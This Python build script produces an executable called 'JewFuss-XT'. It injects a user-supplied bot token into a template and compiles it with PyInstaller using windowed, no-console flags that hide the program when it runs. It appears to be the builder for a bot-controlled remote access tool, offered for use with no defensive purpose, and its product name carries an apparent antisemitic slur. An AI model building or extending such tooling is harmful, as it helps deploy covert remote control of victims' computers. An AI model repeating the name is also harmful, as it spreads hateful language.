import os
import shutil
import tempfile
import subprocess
import time

save_unpackaged = False # This is the only thing you should mess with otherwise you may break it

template_path = os.path.abspath('./source/JewFuss-XT.template')
output_dir = os.path.abspath('builds')
output_path = os.path.join(output_dir, 'JewFuss-XT.exe')
log_file_path = os.path.join(output_dir, 'easy-compiler-build.log')
token = 'TOKEN = "BOT-TOKEN-GOES-HERE"'
while True:
    user_input = input('Please enter bot token:\n>> ').strip()
    if user_input:
        user_input = f'TOKEN = "{user_input}"'
        break
    else:
        print("Error: input cannot be empty\n")


print("\nTemplate path:", template_path)
print("\nOutput directory:", output_dir)
print("\nOutput location:", output_path +"\n")

with open(template_path, 'r', encoding='utf-8') as file:
    content = file.read()

content = content.replace(token, user_input)

temp_dir = tempfile.mkdtemp()
temp_file = os.path.join(temp_dir, 'temp.py')


if os.path.exists(output_path):
    timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
    new_name = f"{timestamp}-JewFuss-XT.exe"
    new_path = os.path.join(output_dir, new_name)
    os.rename(output_path, new_path)
    print(f"\nRenaming {os.path.basename(output_path)} to {new_name}\n")
elif not os.path.exists(output_dir):
    os.makedirs(output_dir)

timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

with open(temp_file, 'w', encoding='utf-8') as file:
    file.write(content)

if save_unpackaged == True:
    with open("./builds/unpackaged-latest.py", 'w', encoding='utf-8') as file:
        file.write(content)

subprocess.run(['pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', '--distpath=builds', '--workpath=data' , '-n=JewFuss-XT.exe'])
shutil.rmtree(temp_dir)

with open(log_file_path, 'a') as log_file:
    log_file.write(f"\"{timestamp}\": {user_input} JewFuss-XT.exe\n")